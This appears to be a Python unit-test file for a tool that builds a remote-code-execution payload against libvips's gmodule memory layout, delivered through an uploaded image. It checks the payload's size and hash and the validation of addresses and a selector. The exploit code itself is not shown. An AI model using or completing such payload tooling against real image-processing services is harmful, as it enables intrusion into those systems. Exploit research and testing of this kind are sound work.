from __future__ import annotations

import hashlib
import unittest

from rce_payload import build_rce_payload
from control_target import derive_control_target
from stack_profile import load_profile


class PayloadProfileTests(unittest.TestCase):
    def test_profile_payload_matches_libvips_gmodule_layout(self) -> None:
        payload = build_rce_payload(
            0x0000700000000000,
            0x5970,
            0x00007000003E995E,
            "uploads/x.jpg",
            load_profile(),
        )
        self.assertEqual(len(payload), 4096)
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(),
            "1c1899747e45e53fb60117cfca722bee63f37604e24a3a623852bdad8a480a74",
        )

    def test_unaligned_libvips_base_is_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "not page-aligned"):
            build_rce_payload(
                0x0000700000000001,
                0x5970,
                0x00007000003E995F,
                profile=load_profile(),
            )

    def test_selector_above_two_bytes_is_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "unsigned two-byte"):
            build_rce_payload(
                0x0000700000000000,
                0x10000,
                0x00007000003E995E,
                profile=load_profile(),
            )

    def test_negative_selector_is_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "unsigned two-byte"):
            build_rce_payload(
                0x0000700000000000,
                -1,
                0x00007000003E995E,
                profile=load_profile(),
            )

    def test_mismatched_control_target_is_rejected(self) -> None:
        profile = load_profile()
        target = derive_control_target(0x0000700000000000, profile)
        with self.assertRaisesRegex(ValueError, "does not match"):
            build_rce_payload(
                target.module_base,
                0x5970,
                target.address + 1,
                profile=profile,
            )


if __name__ == "__main__":
    unittest.main()
